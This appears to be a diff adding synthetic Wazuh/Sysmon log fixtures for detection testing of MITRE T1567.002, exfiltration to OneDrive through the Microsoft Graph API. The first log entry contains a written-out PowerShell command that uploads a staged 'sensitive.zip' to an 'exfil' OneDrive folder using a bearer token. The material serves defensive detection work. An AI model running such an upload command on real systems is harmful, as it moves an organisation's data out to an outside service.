@@ -1,0 +1,170 @@
+{
+  "_metadata": {
+    "attack_id": "T1567.002",
+    "variation": "002",
+    "name": "Exfiltration to OneDrive - Graph API",
+    "description": "Upload files to OneDrive using Microsoft Graph API",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell Graph API upload",
+      "sequence": 1,
+      "timestamp": "2026-02-10T18:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:20:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: OneDrive Exfiltration",
+          "id": "100603",
+          "mitre": {
+            "id": [
+              "T1567.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Web Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589200.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 18:20:00.000",
+              "processGuid": "{8df8f34e-2810-65c7-0044-000000000400}",
+              "processId": "9890",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://graph.microsoft.com/v1.0/me/drive/root:/exfil/sensitive.zip:/content' -Method PUT -InFile 'C:\\staging\\sensitive.zip' -Headers @{Authorization='Bearer eyJ0eXAiOiJKV1QiLCJhbGc...'}\"",
+              "currentDirectory": "C:\\Users\\admin2\\",
+              "user": "CORP\\admin2",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=6789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF012345",
+              "parentProcessGuid": "{8df8f34e-2810-65c7-0000-000000000400}",
+              "parentProcessId": "4456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.002",
+        "fomorian_technique_name": "Exfiltration to OneDrive - Graph API"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - HTTPS to graph.microsoft.com",
+      "sequence": 2,
+      "timestamp": "2026-02-10T18:20:01.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:20:01.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 3: Network Connection to Microsoft Graph",
+          "id": "100604",
+          "mitre": {
+            "id": [
+              "T1567.002"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Web Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589201.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 18:20:01.000",
+              "processGuid": "{8df8f34e-2810-65c7-0044-000000000400}",
+              "processId": "9890",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\admin2",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "55345",
+              "destinationIsIpv6": "false",
+              "destinationIp": "13.107.42.16",
+              "destinationHostname": "graph.microsoft.com",
+              "destinationPort": "443"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.002",
+        "fomorian_technique_name": "Exfiltration to OneDrive - Graph API"
+      }
+    }
+  ]
+}
